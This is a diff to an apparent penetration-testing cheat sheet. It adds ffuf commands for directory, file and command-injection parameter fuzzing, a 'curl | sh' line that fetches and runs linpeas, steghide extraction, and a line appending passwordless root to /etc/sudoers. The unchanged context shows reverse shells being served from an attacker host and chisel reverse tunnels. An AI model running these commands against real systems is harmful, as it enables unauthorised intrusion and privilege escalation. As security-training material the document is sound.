@@ -18,7 +18,12 @@ Enumeration
 - `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
 - `nmap -Pn -sVC -vv -p$ports $IP`
 ### Web Directory Fuzzing
-- `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://xxxxxx.xxx/FUZZ -fc 404,400`
+- `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://xxxxxx.xxx/FUZZ -fc 404,400 -fs 0`
+- `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://xxxxxx.xxx/assets/FUZZ -fc 404,400 -fs 0`
+### Web File Fuzzing
+- `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://xxxxxx.xxx/assets/FUZZ -fc 404,400 -fs 0`
+### Web Parameter Fuzzing for Host Command Injection
+- `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://xxxxxx.xxx/assets/index.php?FUZZ=id -fc 404,400 -fs 0`
 ### VHost Fuzzing
 - `ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u https://test.url -H "Host: FUZZ.test.url"`
 ### Things to do on the Target Machine Once you Have a Foothold
@@ -79,12 +84,27 @@ Tunneling
 2. Start chisel server on attacker machine `chisel server --reverse --port 9001`
 3. On the target run `chisel client 10.x.x.x:9001 R:2049:127.0.0.1:2049`
 
+Run linpeas From Source if Target Machine has Internet Connection
+------
+- `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
+
 Facilitation of File Transfers Between Attacker and Target
 ------
 ### Python web server
 1. Start a simple web server from current working directory `python3 -m http.server 8000`
   - Download a file from aforementioned simple web server `wget http://10.x.x.x:8000/revsh.php` or `curl -O http://10.x.x.x:8000/chisel`
   - Run a file from aforementioned simple web server `curl http://10.x.x.x:8000/linpeas.sh | sh`
+
+Steganography
+------
+### Using steghide
+- `steghide extract -sf image.jpg`
+
+Privilege Escalation
+------
+### Linux
+#### /etc/sudoers
+- `echo "$USER ALL=NOPASSWD: ALL" >> /etc/sudoers` Change $USER to the actual username if the variable doesn't work
 
 Web App Testing
 ------
